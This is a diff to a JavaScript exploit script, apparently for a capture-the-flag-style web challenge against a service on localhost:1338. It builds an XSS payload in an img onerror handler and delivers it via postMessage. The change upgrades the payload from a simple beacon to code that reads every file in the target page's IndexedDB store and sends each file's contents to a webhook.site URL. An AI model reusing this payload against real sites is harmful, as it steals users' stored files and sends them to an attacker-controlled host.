@@ -5,9 +5,11 @@
       let c = window.open("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?third=true");
 
 
-      let x = window.open("http://localhost:1338") ;
+      let x = window.open("http://localhost:1338");
+
+      let payload = `(async () => {    const request = indexedDB.open("Files", 1);    request.onsuccess = async () => {        const db = request.result;        const tx = db.transaction(["files", "info"], "readwrite");        const filesStore = tx.objectStore("files");        const infoStore = tx.objectStore("info");        const getAllReq = filesStore.getAll();        getAllReq.onsuccess = () => {            const files = getAllReq.result;            files.forEach(fileEntry => {                const reader = new FileReader();                reader.onload = function (e) {                    var xhr = new XMLHttpRequest();                    xhr.open("GET", encodeURI("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?vroum=" + e.target.result), false);                    xhr.send(null);                };                reader.onerror = function (e) {                    console.error('Error reading file:', e);                };                reader.readAsText(fileEntry.file);            });            console.log("All files updated to public.");        };    };})();`;
     
-      let blob = new Blob([`<img src=x onerror='var xhr = new XMLHttpRequest(); xhr.open("GET", "https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913", false); xhr.send(null)'>`], { type: "text/html" });
+      let blob = new Blob([`<img src=x onerror='${payload}'>`], { type: "text/html" });
 
       setTimeout(() => {
         x.postMessage(
